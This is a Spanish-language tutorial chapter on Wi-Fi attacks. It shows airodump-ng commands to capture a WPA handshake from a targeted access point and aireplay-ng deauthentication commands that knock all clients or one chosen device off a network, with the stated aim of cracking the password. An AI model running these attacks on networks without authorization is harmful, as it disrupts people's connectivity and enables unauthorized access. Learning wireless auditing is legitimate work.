# 03 - Captura de Paquetes y Ataques

Esta es la fase donde obtenemos los datos necesarios para intentar descifrar la contraseña.

## Escaneo Técnico con Airodump-ng

A diferencia de `nmcli`, `airodump-ng` muestra tráfico en tiempo real y detecta clientes conectados.

```bash
sudo airodump-ng wlan0
```
![Captura de pantalla de airodump general](image/Imagen7.png)

---

## Captura Dirigida (Handshake)

Para obtener el **WPA Handshake** (el momento en que un cliente se conecta y envía la clave cifrada), debemos concentrarnos en un solo objetivo.

```bash
sudo airodump-ng -c 1 --bssid 06:A0:65:C2:90:A6 -w captura wlan0
```
**Desglose de parámetros**:
- `-c 1`: Especifica el **canal** (Channel). Evita que la tarjeta salte de un canal a otro.
- `--bssid`: Filtra solo el tráfico de esa dirección MAC específica.
- `-w captura`: Crea archivos (como `captura-01.cap`) donde se guardarán los paquetes.

![Captura de pantalla con handshake](image/Imagen8.png)



---

## Ataque de Desautenticación (Deauth)

Si no queremos esperar a que un cliente se conecte solo, podemos forzar su desconexión para que, al reconectarse automáticamente, capturemos el handshake.

### 1. Sincronizar el canal
Obligamos a la tarjeta a estar en la misma frecuencia que el router.
```bash
sudo iwconfig wlan0mon channel 6
```

### 2. Lanzar el Ataque Global
Enviamos paquetes de "despedida" falsos en nombre del router para que todos se desconecten.

```bash
sudo aireplay-ng -0 10 -a 06:A0:65:C2:90:A6 wlan0
```
- `-0`: Indica que el ataque es de **Desautenticación**.
- `10`: Número de ráfagas (ataques). 
- `-a`: El BSSID del punto de acceso (Access Point).

![Captura de pantalla con handshake](image/Imagen10.png)

### 3. Ataque a un Cliente Específico
Si solo quieres molestar o capturar el handshake de un dispositivo concreto (ej. un móvil):

```bash
sudo aireplay-ng -0 10 -a 06:A0:65:C2:90:A6 -c [MAC_DEL_CLIENTE] wlan0
```
- `-c`: Client MAC. Solo ese dispositivo será desconectado.
